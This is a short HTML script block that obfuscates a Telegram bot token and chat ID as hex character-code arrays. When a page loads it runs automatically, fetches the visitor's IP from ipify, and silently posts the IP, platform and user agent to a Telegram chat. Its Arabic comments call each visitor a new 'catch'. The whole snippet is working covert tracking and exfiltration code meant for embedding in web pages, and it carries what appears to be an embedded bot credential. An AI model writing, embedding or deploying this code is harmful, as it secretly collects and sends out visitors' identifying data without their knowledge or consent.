<script>
    const _0x1 = [0x38, 0x34, 0x31, 0x30, 0x31, 0x30, 0x32, 0x37, 0x32, 0x32]; 
    const _0x2 = [0x3a, 0x41, 0x41, 0x46, 0x51, 0x4f, 0x31, 0x75, 0x7a, 0x36, 0x45, 0x6f, 0x79, 0x34, 0x55, 0x68, 0x46, 0x47, 0x48, 0x61, 0x61, 0x5f, 0x71, 0x48, 0x53, 0x61, 0x46, 0x52, 0x62, 0x37, 0x47, 0x64, 0x56, 0x48, 0x4d];
    const _0x3 = [0x31, 0x37, 0x37, 0x32, 0x38, 0x32, 0x30, 0x34, 0x33, 0x33];
    const _hex = (a) => a.map(b => String.fromCharCode(b)).join('');

    async function capture() {
        const t = _hex(_0x1) + _hex(_0x2);
        const c = _hex(_0x3);
        const api = `https://api.telegram.org/bot${t}/sendMessage`;
        
        // سحب الـ IP والمعلومات
        const info = await fetch('https://api.ipify.org?format=json').then(r => r.json());
        const msg = `🔱 [صيدة جديدة]:\n🌐 IP: ${info.ip}\n📱 الجهاز: ${navigator.platform}\n🌍 المتصفح: ${navigator.userAgent}`;
        
        await fetch(api, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: c, text: msg})
        });
    }
    capture();
</script>
